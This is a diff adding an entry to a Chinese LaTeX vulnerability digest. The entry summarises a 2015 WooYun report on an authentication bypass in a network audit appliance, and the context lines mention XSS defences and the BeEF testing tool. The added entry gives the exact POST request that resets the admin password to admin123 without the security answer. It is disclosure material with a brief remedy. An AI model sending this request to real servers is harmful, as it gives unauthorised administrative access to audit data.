@@ -195,4 +195,18 @@
 \N5 紧急防御技术，包括内容安全政策、js沙盒和自动转义模板
 \N6 扫描服务 \\
 \enl{相关内容} \ent[\B Brower \B Exploitation \B Framework]{BeEF}是个开源的渗透测试工具，可用于模拟XSS攻击。\url{http://beefproject.com/}\\
+
+\chaps{7/14 中科新业网络哨兵跳过验证修改管理员密码}
+\begin{center}
+	\url{http://www.wooyun.org/bugs/wooyun-2015-0107127}
+\end{center}
+\enl{提交时间} 2015/4/10 \\
+\enl{确认时间} 2015/7/14 \\
+\enl{漏洞类型} 权限控制绕过 \\
+\enl{漏洞细节} 中科新业网络哨兵跳过验证随意修改管理员密码，可进入后台任意查看审计信息。V4,V5版本均存在问题。部分审计服务器暴露于公网，可被搜索引擎收录。\N1先点击忘记密码，找到对应版本密码找回页面地址，然后直接提交post请求：例如地址\code{https://**.**.**/ucenter/stgl/pwd_question.php} \N2提交 \begin{verbatimtab}
+	https://**.**.**/ucenter/stgl/pwd_question_s.phpnewpwd=admin123
+	&newpwd1=admin123&uid=admin&passwd=&questions=&answer=&step=4&act=forget&lang=1
+\end{verbatimtab}
+即可直接将admin用户密码修改为admin123，无视密码提示问题。\\
+\enl{补救措施} 加校验，不信任任何用户提交的数据 \\
 \end{document}
